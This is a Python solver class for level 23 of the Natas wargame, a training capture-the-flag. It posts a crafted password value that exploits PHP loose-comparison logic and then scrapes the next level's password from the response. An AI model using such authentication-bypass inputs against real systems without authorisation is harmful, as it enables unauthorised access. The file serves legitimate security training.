import re
from .base_solver import NatasSolver

class Natas23Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Make request with password that passes the numeric check
            response = self.make_request(
                method="POST",
                data={"passwd": "11iloveyou"}
            )
            
            # Extract password using the exact pattern
            match = re.findall(r"Username: natas24 Password: (.*)</pre>", response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas23: {str(e)}")